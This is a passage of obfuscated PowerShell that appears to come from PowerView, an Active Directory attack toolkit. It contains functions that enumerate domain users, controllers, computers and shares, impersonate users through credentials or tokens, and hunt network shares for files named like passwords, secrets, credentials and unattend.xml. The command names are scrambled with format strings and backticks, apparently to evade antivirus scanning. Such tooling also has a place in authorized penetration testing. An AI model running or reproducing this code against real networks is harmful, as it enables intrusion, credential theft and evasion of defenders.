        if (${pSbouN`D`PAr`AmeTE`RS}[("{2}{3}{1}{0}"-f 'ty','i','User','Ident')]) { ${U`se`RseAr`c`HerArGuMeNtS}[("{2}{0}{1}"-f'de','ntity','I')] = ${UsERi`d`E`N`TIty} }
        if (${PSbOuNdpara`m`eTE`RS}[("{0}{3}{2}{1}" -f 'User','n','omai','D')]) { ${uSeRs`EaRc`hEraR`gUm`eN`TS}[("{0}{1}"-f'Do','main')] = ${USERD`o`maIn} }
        if (${PsBOu`NDPA`RaMET`E`Rs}[("{4}{0}{1}{3}{2}"-f 'AP','Filt','r','e','UserLD')]) { ${U`SEr`seA`RCHeR`ARGU`m`entS}[("{1}{2}{0}"-f 'PFilter','L','DA')] = ${uSerL`d`APFiL`TeR} }
        if (${ps`BouNdpAr`A`m`E`TERS}[("{4}{2}{3}{1}{0}" -f'e','s','r','chBa','UserSea')]) { ${U`s`ersEarche`RA`RG`UMenTs}[("{0}{1}{2}"-f'Searc','hB','ase')] = ${U`se`Rsea`RC`hbaSE} }
        if (${Ps`BoUN`D`ParaM`eteRs}[("{1}{3}{2}{0}{4}" -f 'inCoun','Use','Adm','r','t')]) { ${u`s`ersEArCHe`RaRGu`mEnTs}[("{2}{1}{0}"-f 'ount','minC','Ad')] = ${UseR`ADm`I`NcOuNT} }
        if (${psBOu`Ndpa`R`A`MeTE`Rs}[("{0}{1}"-f 'Ser','ver')]) { ${UsER`S`EarcheRARG`UMEn`TS}[("{1}{0}" -f'erver','S')] = ${S`ERvER} }
        if (${p`SbO`UNDPaR`AM`EterS}[("{2}{0}{1}" -f 'hScop','e','Searc')]) { ${U`sERSE`ArcHERA`R`GUMeN`TS}[("{0}{1}{2}"-f 'Sear','ch','Scope')] = ${S`eA`RCHSco`pE} }
        if (${Ps`Bound`PaRA`m`eT`ERS}[("{0}{1}{3}{2}{4}" -f'Resul','tPa','e','g','Size')]) { ${uSeRS`earChEraR`GU`me`NTs}[("{1}{0}{2}"-f'eSiz','ResultPag','e')] = ${r`E`SUltP`Age`SIze} }
        if (${P`SBoU`N`dpaR`AMetE`Rs}[("{0}{4}{1}{3}{2}"-f 'Ser','erTi','t','meLimi','v')]) { ${usER`SEarC`HErA`Rgu`MentS}[("{2}{1}{0}"-f't','erverTimeLimi','S')] = ${sE`RvE`R`TIMe`LiMIt} }
        if (${p`s`BOuNdpar`A`mE`TERS}[("{1}{2}{0}"-f'tone','Tom','bs')]) { ${uSE`RSE`A`RChE`R`A`RguMenTS}[("{2}{1}{0}" -f'ne','mbsto','To')] = ${tom`BSt`oNe} }
        if (${P`Sboun`DpaR`A`mE`TeRs}[("{1}{2}{0}"-f 'al','Credent','i')]) { ${uSER`Se`ArcH`er`ARgum`ENTS}[("{0}{2}{1}" -f 'Cred','tial','en')] = ${C`R`eDENtiAl} }

        if (${PSbO`UNdPA`RamEtE`Rs}[("{2}{0}{1}{3}"-f 'erIdent','i','Us','ty')] -or ${p`sBOUNdpA`RAmEt`e`RS}[("{0}{1}{2}" -f'Use','rLDAPFilte','r')] -or ${pSboU`Nd`Par`AMeters}[("{3}{2}{0}{1}"-f 'earc','hBase','rS','Use')] -or ${psBOunDPa`RAME`T`eRS}[("{3}{1}{2}{0}"-f 'unt','erAd','minCo','Us')]) {
            ${TArgE`TU`s`ers} = &("{0}{2}{1}{3}"-f'Get','nU','-Domai','ser') @UserSearcherArguments | &("{2}{1}{0}" -f 't-Object','lec','Se') -ExpandProperty ("{0}{2}{1}{3}" -f'sam','n','account','ame')
        }
        elseif (${psb`OundP`A`Rame`Ters}[("{0}{4}{3}{2}{1}"-f'Use','y','t','oupIdenti','rGr')] -or (-not ${PSbOun`DPA`RamE`T`ERs}[("{0}{1}{2}" -f 'Fil','te','r')])) {
            
            ${GroUpsEarCHEr`ArGuM`e`N`TS} = @{
                ("{1}{0}{2}"-f 'it','Ident','y') = ${uSE`RG`Rou`p`iD`eNtiTy}
                ("{1}{0}{2}"-f 'ur','Rec','se') = ${T`RuE}
            }
            &("{1}{0}{2}"-f'Ve','Write-','rbose') ('U'+'serGroupIdenti'+'ty'+': '+"$UserGroupIdentity")
            if (${Psbo`UN`DPaR`A`meteRs}[("{2}{1}{0}"-f 'omain','serD','U')]) { ${grOUPse`ARCHe`RARGu`m`e`NtS}[("{0}{1}"-f 'Domai','n')] = ${USERD`oMa`IN} }
            if (${pSb`oUNdPa`RAme`TErs}[("{2}{0}{1}"-f 'h','Base','UserSearc')]) { ${grO`Up`s`eArCHERARg`UmE`Nts}[("{1}{0}{2}" -f'archBa','Se','se')] = ${UsErS`EA`RcH`BASE} }
            if (${p`SB`OUnDPARaM`ETErs}[("{1}{0}" -f 'ver','Ser')]) { ${group`SE`ArChERA`RgUm`EnTs}[("{1}{0}{2}" -f've','Ser','r')] = ${se`Rv`Er} }
            if (${P`S`B`oUNDpAra`MET`eRS}[("{2}{1}{0}{3}" -f'arch','e','S','Scope')]) { ${Gr`OuP`sE`ArChE`RA`RguMen`Ts}[("{2}{3}{1}{0}" -f'e','p','Se','archSco')] = ${SeArCH`SC`O`pE} }
            if (${pSB`O`UNDP`A`RAM`ETERS}[("{2}{1}{3}{0}"-f 'e','esult','R','PageSiz')]) { ${GRou`PseA`RcHe`RArGu`MENts}[("{1}{0}{2}{3}{4}"-f 'sultP','Re','a','geSi','ze')] = ${r`E`S`UltPAgESize} }
            if (${PSBO`Und`PA`RAMETERS}[("{4}{3}{1}{0}{2}"-f 'Lim','me','it','verTi','Ser')]) { ${g`R`ouPs`EAr`cH`ERarGUME`NTs}[("{4}{2}{1}{0}{3}"-f'i','verTimeLim','r','t','Se')] = ${s`Ervert`Im`eLIMIT} }
            if (${pSBo`UNdP`ARAm`etErs}[("{1}{0}{2}{3}"-f 'ombs','T','to','ne')]) { ${GR`o`UPSeARcHeR`ARgum`enTS}[("{2}{0}{1}"-f'ombst','one','T')] = ${tOMb`Sto`Ne} }
            if (${psBoUNDpAraM`Et`e`Rs}[("{1}{2}{0}" -f 'ntial','Cred','e')]) { ${gRoUP`S`E`ARcH`eRArG`UmEn`Ts}[("{2}{1}{0}" -f 'l','redentia','C')] = ${Cr`EDeN`TiAL} }
            ${TAr`gE`TUseRS} = &("{0}{2}{3}{1}"-f'Get-Dom','r','ainG','roupMembe') @GroupSearcherArguments | &("{1}{0}{2}{3}"-f 'ec','Sel','t-Ob','ject') -ExpandProperty ("{2}{0}{1}{3}"-f 'be','rNam','Mem','e')
        }

        
        if (${PSbouNd`PARam`ETE`Rs}[("{2}{0}{1}"-f'am','e','ComputerN')]) {
            ${tar`getCOmput`E`Rs} = ${cOmpUTe`R`NA`ME}
        }
        else {
            
            ${DcS`ea`RcHeRArgU`M`entS} = @{
                ("{1}{0}"-f'P','LDA') = ${tR`UE}
            }
            if (${psbOU`NdpARA`MEtE`Rs}[("{0}{1}"-f'Domai','n')]) { ${dC`sEA`R`ch`E`RArgUm`eNTS}[("{1}{0}"-f 'n','Domai')] = ${DO`maIn} }
            if (${pSBou`NdPA`Ramet`ers}[("{1}{0}" -f 'erver','S')]) { ${dC`seaRc`H`E`RArguM`EnTS}[("{0}{1}"-f 'Serve','r')] = ${S`ervEr} }
            if (${PS`B`O`UnDpArAm`eTerS}[("{2}{1}{3}{0}"-f 'al','re','C','denti')]) { ${dCs`e`ARCheRargU`MEntS}[("{0}{1}{2}"-f 'Cre','dentia','l')] = ${c`RedEnT`i`Al} }
            &("{1}{2}{0}" -f 'ose','Write-V','erb') ('['+'Find-D'+'omai'+'nUs'+'erEvent] '+'Query'+'i'+'ng '+'f'+'or '+'d'+'oma'+'in '+'control'+'ler'+'s '+'in'+' '+'dom'+'ai'+'n: '+"$Domain")
            ${T`ArgE`TC`OM`PutErs} = &("{3}{0}{2}{1}"-f't-DomainC','ller','ontro','Ge') @DCSearcherArguments | &("{0}{2}{1}"-f 'Se','ct-Object','le') -ExpandProperty ("{0}{2}{1}"-f 'dns','e','hostnam')
        }
        if (${ta`RgeTcO`MPu`Te`RS} -and (${t`A`R`g`EtcOmPUteRs} -isnot [System.Array])) {
            ${T`ArgetCOmp`UT`ERs} = @(,${TArGe`TcO`MpUTe`RS})
        }
        &("{0}{1}{2}{3}" -f 'Wri','te-V','e','rbose') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &("{2}{1}{0}" -f 'ose','-Verb','Write') ('[Fi'+'n'+'d-DomainU'+'serEven'+'t] '+'Tar'+'g'+'etComputers '+"$TargetComputers")
        if (${ta`R`gEtcOmputeRs}."leNG`Th" -eq 0) {
            throw ("{2}{0}{5}{6}{3}{1}{8}{7}{4}" -f 'nd-Doma','nt] No hosts f','[Fi','Eve','numerate','inU','ser','o e','ound t')
        }

        
        ${h`Os`Te`NumblocK} = {
            Param(${COMP`U`T`ERNAME}, ${STaRTt`I`mE}, ${EN`dt`iMe}, ${mA`Xe`V`EnTS}, ${TARG`EtU`SE`RS}, ${F`IlTEr}, ${cR`EdEn`T`iAl})

            ForEach (${TAR`gEtComP`UtEr} in ${COMpUte`RNa`me}) {
                ${Up} = &("{0}{4}{3}{2}{1}" -f 'Test','ion','ct','Conne','-') -Count 1 -Quiet -ComputerName ${tA`Rge`TCOM`puTER}
                if (${uP}) {
                    ${doM`A`In`UsErE`VEn`TARGs} = @{
                        ("{0}{1}{2}"-f 'C','o','mputerName') = ${tarGetc`OMp`UTEr}
                    }
                    if (${s`Tart`Ti`Me}) { ${dO`MaiN`USE`RE`V`EN`TArGs}[("{1}{0}"-f 'me','StartTi')] = ${StAR`T`TiME} }
                    if (${EndT`Ime}) { ${DomAi`NuSer`eV`en`TARgS}[("{1}{0}"-f'ndTime','E')] = ${e`NDt`iME} }
                    if (${Ma`xEV`EnTs}) { ${do`MAIN`USe`R`eVEnTargS}[("{0}{1}{2}"-f 'MaxEv','e','nts')] = ${ma`x`EvE`NtS} }
                    if (${c`ReDE`NTIaL}) { ${dOmaINUSE`Re`VE`N`TaR`gS}[("{0}{2}{1}{3}" -f 'C','entia','red','l')] = ${c`ReDEnt`I`AL} }
                    if (${fi`lteR} -or ${TA`R`gETu`sErs}) {
                        if (${tarG`EtU`SerS}) {
                            &("{0}{3}{4}{1}{2}"-f'G','ainUserEve','nt','et-Do','m') @DomainUserEventArgs | &("{1}{2}{0}"-f't','Where-Obje','c') {${t`Arget`USErS} -contains ${_}."t`ARg`E`Tuser`NAme"}
                        }
                        else {
                            ${OpE`RAT`Or} = 'or'
                            ${fiLt`eR}."K`eYs" | &("{0}{1}{3}{2}" -f'ForE','a','ct','ch-Obje') {
                                if ((${_} -eq 'Op') -or (${_} -eq ("{2}{0}{1}"-f 'at','or','Oper')) -or (${_} -eq ("{0}{2}{1}" -f'Ope','ation','r'))) {
                                    if ((${FIlt`ER}[${_}] -match '&') -or (${fi`LT`Er}[${_}] -eq 'and')) {
                                        ${o`PERAT`or} = 'and'
                                    }
                                }
                            }
                            ${K`eYs} = ${FIL`TEr}."K`EYs" | &("{1}{0}{3}{2}"-f'O','Where-','ct','bje') {(${_} -ne 'Op') -and (${_} -ne ("{1}{0}{2}"-f 'p','O','erator')) -and (${_} -ne ("{0}{1}" -f 'Operatio','n'))}
                            &("{2}{1}{4}{3}{0}" -f 'Event','-Domai','Get','ser','nU') @DomainUserEventArgs | &("{0}{3}{1}{4}{2}" -f'F','r','ch-Object','o','Ea') {
                                if (${OpErA`T`OR} -eq 'or') {
                                    ForEach (${k`ey} in ${K`EYS}) {
                                        if (${_}."$Key" -match ${FI`lTEr}[${K`eY}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (${k`eY} in ${KE`YS}) {
                                        if (${_}."$Key" -notmatch ${f`iLTEr}[${K`EY}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{3}{0}{4}{5}{1}{2}"-f't-Do','rEv','ent','Ge','mainU','se') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${P`sboU`ND`PaRamE`TeRS}[("{1}{0}" -f 'elay','D')] -or ${P`SboUnDp`ARa`Me`Te`Rs}[("{1}{0}{2}" -f 'top','S','OnSuccess')]) {

            &("{1}{2}{3}{0}{4}" -f 'Ve','Wr','i','te-','rbose') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &("{0}{4}{2}{3}{1}"-f 'Wri','rbose','e','-Ve','t') ('[F'+'ind-Do'+'m'+'ainUserE'+'v'+'e'+'nt'+'] '+'D'+'elay: '+"$Delay, "+'Jitter:'+' '+"$Jitter")
            ${cOu`NTER} = 0
            ${Ran`d`NO} = &("{1}{2}{0}" -f'bject','N','ew-O') ("{1}{0}{2}"-f 'ystem.Ran','S','dom')

            ForEach (${targ`e`TcoMpU`TeR} in ${targ`EtC`Om`PU`Ters}) {
                ${Cou`Nt`Er} = ${CO`UN`Ter} + 1

                
                &("{1}{0}{2}"-f't-S','Star','leep') -Seconds ${r`AndNo}.("{1}{0}" -f 'ext','N').Invoke((1-${j`ITT`eR})*${D`El`Ay}, (1+${j`i`TTER})*${del`Ay})

                &("{3}{4}{0}{1}{2}"-f 'e-Ve','rb','ose','Wri','t') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${reS`Ult} = &("{2}{1}{0}{4}{3}"-f'ke','o','Inv','Command','-') -ScriptBlock ${Ho`STe`NuMBlO`Ck} -ArgumentList ${T`ARg`ET`COmputER}, ${S`TA`RTTIME}, ${End`TI`ME}, ${maXe`V`E`NtS}, ${TarGEt`US`E`RS}, ${F`iLT`ER}, ${CR`EDen`TI`Al}
                ${re`s`Ult}

                if (${ResU`lt} -and ${StO`poNs`UCc`ess}) {
                    &("{3}{0}{1}{2}" -f'e-','Ver','bose','Writ') ("{4}{6}{0}{2}{3}{8}{1}{7}{9}{5}{10}" -f ' us','nd, retu','er',' fo','[Find-Dom','g ea','ainUserEvent] Target','rn','u','in','rly')
                    return
                }
            }
        }
        else {
            &("{1}{0}{2}{3}"-f'Ve','Write-','rb','ose') ('[Find-D'+'om'+'ain'+'Use'+'rEve'+'nt'+'] '+'Us'+'ing '+'thread'+'ing'+' '+'wi'+'th '+'t'+'hreads: '+"$Threads")

            
            ${scRIp`TpaR`AMS} = @{
                ("{2}{0}{1}" -f'a','rtTime','St') = ${STA`RtT`i`Me}
                ("{0}{1}{2}" -f 'E','ndTim','e') = ${e`NdTiME}
                ("{2}{0}{3}{1}" -f'xEv','s','Ma','ent') = ${ma`XevE`NTs}
                ("{0}{2}{1}" -f'Target','s','User') = ${Ta`RgetU`SERs}
                ("{0}{1}" -f'Filt','er') = ${fil`T`Er}
                ("{1}{2}{0}"-f'ial','Creden','t') = ${crE`De`NTIal}
            }

            
            &("{0}{2}{1}{3}"-f 'New-T','eaded','hr','Function') -ComputerName ${ta`RgeTCoMP`Ut`ers} -ScriptBlock ${H`o`s`T`ENUmbLock} -ScriptParameters ${S`CRIpT`PAra`Ms} -Threads ${THR`EAds}
        }
    }
}


function fI`ND`-`DOm`AinsHare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}"-f 'cess','Pr','o','PSShould'}, '')]
    [OutputType({"{3}{0}{4}{1}{2}" -f 'iew','eI','nfo','PowerV','.Shar'})]
    Param(
        [Parameter(PositIon = 0, valuefrOmPiPeliNE = ${tr`UE}, ValUEFrOMpiPELiNEBypROPeRtYNAmE = ${T`RUE})]
        [Alias({"{1}{0}{2}{3}" -f 'NSH','D','ostNam','e'})]
        [String[]]
        ${CoMpu`T`ERnAme},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'D','omain'})]
        [String]
        ${coM`PuT`ErD`oMAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`ompu`T`ErLDapfIlT`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Co`mput`ERsE`AR`C`hbAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}" -f 'ng','Operat','i','System'})]
        [String]
        ${c`Omp`UTeRO`PE`RAtiN`GSYSt`EM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'v','Ser','icePack'})]
        [String]
        ${ComP`UTErsEr`V`iC`ePA`Ck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'Name','ite','S'})]
        [String]
        ${ComPU`TersI`T`eNaME},

        [Alias({"{0}{1}{2}"-f 'Check','Ac','cess'})]
        [Switch]
        ${CHEck`SHAR`E`AcCeSs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{1}{0}{2}" -f 'tro','Con','ller','Doma','in'})]
        [String]
        ${SEr`VER},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{0}{1}"-f 'O','neLevel'}, {"{1}{2}{0}" -f'ee','Sub','tr'})]
        [String]
        ${s`EaR`chscoPe} = ("{2}{0}{1}"-f 'bt','ree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReS`U`ltPaGE`S`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERVErT`imELi`m`iT},

        [Switch]
        ${T`Ombs`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`dE`NtiaL} =  ${5r0`Vk}::"E`mPtY",

        [ValidateRange(1, 10000)]
        [Int]
        ${D`eL`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`itTeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${THR`eAdS} = 20
    )

    BEGIN {

        ${CoMpu`TE`RseArC`HERArgUMe`N`Ts} = @{
            ("{2}{0}{1}"-f 'op','erties','Pr') = ("{1}{2}{0}" -f'ame','dnsho','stn')
        }
        if (${pS`Boun`dP`AramEters}[("{0}{3}{4}{2}{1}"-f 'ComputerD','n','ai','o','m')]) { ${comp`U`TErSEa`RC`heRaR`gu`m`EnTs}[("{1}{0}"-f 'n','Domai')] = ${c`OMPuTER`DO`M`AiN} }
        if (${p`SB`ou`NdPARA`MEt`ErS}[("{0}{3}{1}{2}" -f'Co','ilte','r','mputerLDAPF')]) { ${c`o`mPU`Te`R`SE`A`RcHerARGUmeN`Ts}[("{2}{3}{0}{1}"-f 'Fil','ter','L','DAP')] = ${CO`mp`UtERldAPF`Il`Ter} }
        if (${PS`BoUn`dpAr`A`MEteRS}[("{0}{3}{2}{1}"-f'C','se','rchBa','omputerSea')]) { ${cOmpu`TERS`ear`CHERAR`GUMEn`Ts}[("{0}{1}{3}{2}" -f'S','earch','e','Bas')] = ${cOmPU`TeRSea`RCH`B`A`Se} }
        if (${Psb`OU`Nd`P`AramETerS}[("{2}{1}{0}{3}"-f 'tr','s','Uncon','ained')]) { ${C`OmPuter`SEArC`HeRaRGU`Men`Ts}[("{3}{2}{1}{0}" -f 'rained','onst','c','Un')] = ${uNCOns`TRa`INeD} }
        if (${PS`BOUNdpAR`AMete`RS}[("{1}{2}{0}{3}{4}" -f 'terO','Comp','u','perating','System')]) { ${c`O`mp`U`TerSeaR`cHEr`ARgUmeN`Ts}[("{0}{2}{1}"-f'Ope','gSystem','ratin')] = ${opeRa`T`Ings`Y`STem} }
        if (${psb`oU`NdparAmeT`ers}[("{2}{0}{1}{4}{3}"-f'erSe','rvi','Comput','ck','cePa')]) { ${co`mp`UteR`se`ARcHErArgum`En`Ts}[("{3}{2}{1}{0}" -f 'k','icePac','erv','S')] = ${SerVI`C`ePa`cK} }
        if (${p`S`B`OUNDPA`RaME`TERS}[("{2}{0}{1}"-f 'uter','SiteName','Comp')]) { ${COMPU`Ter`sEArcH`eR`Ar`GU`mENtS}[("{1}{0}"-f 'e','SiteNam')] = ${Site`N`AMe} }
        if (${P`SBouN`dP`AR`AMetErS}[("{1}{0}{2}" -f 'erv','S','er')]) { ${coM`Pu`TeRs`Ear`CHeRArgUm`En`Ts}[("{0}{1}"-f 'Serv','er')] = ${Se`RVeR} }
        if (${PsboUN`D`Par`AMet`e`Rs}[("{0}{3}{1}{2}"-f'Se','cop','e','archS')]) { ${ComP`UtE`RsE`ARC`H`ErArg`UMenTs}[("{0}{1}{2}" -f'S','ear','chScope')] = ${s`eaRChs`COpE} }
        if (${ps`BO`UNDPArA`mETe`RS}[("{2}{3}{0}{1}" -f'ultPa','geSize','R','es')]) { ${CoM`pUtersE`ARCheRaRG`Um`e`Nts}[("{0}{1}{2}{3}" -f 'ResultPa','ge','Si','ze')] = ${R`EsU`lT`pAge`sizE} }
        if (${P`s`Bou`NdpArAmeTERS}[("{3}{1}{0}{2}"-f'i','rTimeLim','t','Serve')]) { ${coMputerse`A`RchER`Arg`UM`ents}[("{1}{0}{2}"-f 'rTimeLimi','Serve','t')] = ${sE`RVeR`TIM`eLiMIT} }
        if (${pS`B`Ou`NDPArA`meTErS}[("{2}{1}{0}" -f 'ne','o','Tombst')]) { ${compU`TERSe`AR`cH`eRaRgUM`eN`TS}[("{2}{1}{0}" -f'one','t','Tombs')] = ${t`ombS`TONE} }
        if (${PS`BOundparA`mE`TerS}[("{1}{0}{2}" -f'ntia','Crede','l')]) { ${CO`MpUTERseA`RC`HErAr`GuME`N`Ts}[("{2}{3}{1}{0}" -f'l','ntia','Cred','e')] = ${cRE`d`E`NTiAL} }

        if (${psBO`Un`D`PARA`MEters}[("{2}{3}{0}{1}"-f 'put','erName','C','om')]) {
            ${t`ArgEtC`OMp`UtErs} = ${c`OMPu`TERnamE}
        }
        else {
            &("{2}{1}{0}" -f'ite-Verbose','r','W') ("{8}{5}{3}{2}{10}{4}{11}{12}{6}{7}{9}{1}{0}" -f 'e domain',' th','re] ','inSha','erying','Find-Doma','te','rs i','[','n','Qu',' c','ompu')
            ${TA`RG`eT`c`OMpu`TeRS} = &("{3}{1}{2}{0}"-f'er','-Domai','nComput','Get') @ComputerSearcherArguments | &("{2}{1}{0}" -f'ect','ct-Obj','Sele') -ExpandProperty ("{1}{0}{2}"-f's','dn','hostname')
        }
        &("{0}{3}{1}{2}" -f 'Writ','os','e','e-Verb') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (${taR`gEtCOM`PU`T`eRS}."leng`Th" -eq 0) {
            throw ("{3}{5}{10}{2}{6}{1}{0}{4}{7}{11}{8}{9}"-f'ts ','s','hare] No ','[F','foun','ind-Doma','ho','d to en','r','ate','inS','ume')
        }

        
        ${hO`STeN`U`mB`lock} = {
            Param(${C`OMputer`NamE}, ${c`heC`kshA`REA`CCeSs}, ${T`ok`enHandle})

            if (${TO`KEN`hA`NDLE}) {
                
                ${nU`ll} = &("{4}{2}{1}{3}{6}{5}{0}"-f 'n','ke-','vo','UserImperso','In','tio','na') -TokenHandle ${t`OK`enHANd`LE} -Quiet
            }

            ForEach (${taRG`e`T`cOmpuTER} in ${co`Mp`UtE`R`NamE}) {
                ${u`P} = &("{1}{3}{0}{2}" -f'st','T','-Connection','e') -Count 1 -Quiet -ComputerName ${TA`RGE`T`cOm`Puter}
                if (${up}) {
                    
                    ${sH`A`Res} = &("{0}{1}{3}{2}"-f'Get-N','et','hare','S') -ComputerName ${T`Arg`eT`C`OMpUtER}
                    ForEach (${SHa`Re} in ${s`HA`RES}) {
                        ${SH`Ar`eNAme} = ${s`H`ARe}."Na`Me"
                        
                        ${P`Ath} = '\\'+${tarG`etCo`MpUt`eR}+'\'+${shaRE`Na`mE}

                        if ((${SHA`R`en`AmE}) -and (${shA`RE`NamE}.("{1}{0}" -f'im','tr').Invoke() -ne '')) {
                            
                            if (${chEcKsHaRE`Acc`E`sS}) {
                                
                                try {
                                    ${N`UlL} =   ${P`4`Z7sd}::("{0}{2}{1}" -f'G','Files','et').Invoke(${pa`Th})
                                    ${ShA`RE}
                                }
                                catch {
                                    &("{1}{3}{2}{0}" -f 'e','Wri','-Verbos','te') ('Err'+'o'+'r '+'acces'+'sin'+'g '+'s'+'hare '+'pat'+'h '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ${S`H`Are}
                            }
                        }
                    }
                }
            }

            if (${toKENH`A`Nd`LE}) {
                &("{3}{2}{0}{1}" -f'rt','ToSelf','voke-Reve','In')
            }
        }

        ${LOgo`Ntok`eN} = ${n`ULL}
        if (${Psb`ouNDpAr`AmEt`erS}[("{1}{2}{0}" -f'ial','Crede','nt')]) {
            if (${PS`BouNdp`A`RAm`e`TeRS}[("{1}{0}"-f'y','Dela')] -or ${p`sb`OUNdpArA`MET`Ers}[("{4}{3}{2}{0}{1}"-f'O','nSuccess','p','to','S')]) {
                ${Lo`gOn`TOK`EN} = &("{6}{4}{0}{1}{2}{5}{3}" -f 'serImp','e','r','ation','ke-U','son','Invo') -Credential ${cRE`deN`TiAl}
            }
            else {
                ${lOGo`NTok`En} = &("{1}{4}{3}{2}{0}" -f 'nation','Invoke','so','serImper','-U') -Credential ${CREd`eN`TIal} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${p`sb`OUnDpArA`M`eT`ERs}[("{0}{1}" -f'Dela','y')] -or ${PSBOUnd`Pa`R`AMetERs}[("{2}{0}{3}{1}" -f't','ss','S','opOnSucce')]) {

            &("{1}{2}{0}{3}" -f 'ite-Ve','W','r','rbose') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            &("{3}{1}{2}{0}"-f'rbose','te','-Ve','Wri') ('[Fi'+'n'+'d-'+'D'+'omainShare'+'] '+'D'+'elay: '+"$Delay, "+'J'+'itte'+'r: '+"$Jitter")
            ${c`ouN`TEr} = 0
            ${rand`NO} = &("{1}{0}{2}"-f 'w-Obje','Ne','ct') ("{0}{2}{1}{3}"-f'Sy','em','st','.Random')

            ForEach (${TaRGEtCo`Mp`U`Ter} in ${TAR`ge`TCo`Mp`UTERS}) {
                ${co`UNter} = ${CoU`N`TER} + 1

                
                &("{1}{2}{0}" -f 'leep','St','art-S') -Seconds ${ran`D`No}.("{1}{0}"-f'ext','N').Invoke((1-${jiTt`eR})*${D`ELay}, (1+${J`I`Tter})*${de`LAY})

                &("{0}{1}{2}" -f'W','rite-Verb','ose') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{4}{2}{3}{0}{1}"-f'omman','d','nvoke','-C','I') -ScriptBlock ${hoS`TEN`U`M`BlOCK} -ArgumentList ${taRgEtCO`m`PUt`eR}, ${chEcK`sh`ARe`AcCeSs}, ${lOGO`N`T`OKen}
            }
        }
        else {
            &("{0}{1}{2}{3}" -f 'Write-Ve','rb','o','se') ('[F'+'in'+'d-'+'Domain'+'Shar'+'e] '+'U'+'si'+'ng '+'thre'+'a'+'ding'+' '+'wi'+'th '+'t'+'hre'+'ads: '+"$Threads")

            
            ${scR`Iptpara`Ms} = @{
                ("{2}{0}{1}{3}"-f 'a','re','CheckSh','Access') = ${C`hE`ck`sh`AREACCESs}
                ("{0}{1}{3}{2}"-f'Tok','en','ndle','Ha') = ${L`oGoNtok`En}
            }

            
            &("{3}{1}{2}{4}{0}"-f 'nction','-Threaded','F','New','u') -ComputerName ${TarGET`c`OMp`UteRS} -ScriptBlock ${HoSTe`N`UMBLoCk} -ScriptParameters ${sCRIp`T`pA`RAMs} -Threads ${tH`Re`Ads}
        }
    }

    END {
        if (${lOg`ONT`oKeN}) {
            &("{1}{3}{0}{5}{2}{4}" -f't','I','oS','nvoke-Rever','elf','T') -TokenHandle ${lOgO`Nto`K`eN}
        }
    }
}


function FIN`D-iNtE`RESTI`Ngdo`MaI`Ns`HAreFIlE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}" -f'ro','ss','PSShouldP','ce'}, '')]
    [OutputType({"{2}{1}{3}{4}{0}"-f'ile','werView.F','Po','o','undF'})]
    [CmdletBinding(deFAULTParamEtErsEtnAME = {"{3}{0}{4}{1}{5}{2}" -f'le','cifi','on','Fi','Spe','cati'})]
    Param(
        [Parameter(PosITioN = 0, vAlUEfrOMPipEline = ${T`Rue}, vAluEfrOMPipelinEbyPropErTynAME = ${T`RUe})]
        [Alias({"{1}{0}{2}"-f'HostNam','DNS','e'})]
        [String[]]
        ${co`MPuTeRna`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COmPuT`e`R`Do`mAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMp`UTErlDa`Pfil`TER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${compu`TersE`ArCH`BAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{4}{1}{2}"-f'per','gSy','stem','O','atin'})]
        [String]
        ${cOmp`U`TEr`oPErATiN`gs`ySTEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}" -f 'ceP','ack','vi','Ser'})]
        [String]
        ${COMpUtEr`sE`Rv`i`CEp`A`CK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'teN','Si','ame'})]
        [String]
        ${C`OM`PUtERsitenA`ME},

        [Parameter(paramEtERSeTNaME = "FilES`pECiFI`C`AtIon")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'rms','e','SearchT'}, {"{1}{0}" -f 's','Term'})]
        [String[]]
        ${i`N`CludE} = @(("{0}{1}{2}" -f'*pas','swo','rd*'), ("{0}{2}{1}" -f'*sensitiv','*','e'), ("{1}{0}" -f 'admin*','*'), ("{0}{1}{2}"-f '*lo','gi','n*'), ("{1}{0}" -f 'secret*','*'), ("{1}{0}{4}{2}{3}"-f 'tte','una','d*.x','ml','n'), ("{0}{2}{1}" -f'*.v','k','md'), ("{0}{1}" -f '*','creds*'), ("{1}{3}{0}{2}"-f 'tial','*c','*','reden'), ("{2}{1}{0}" -f 'config','.','*')),

        [ValidateNotNullOrEmpty()]
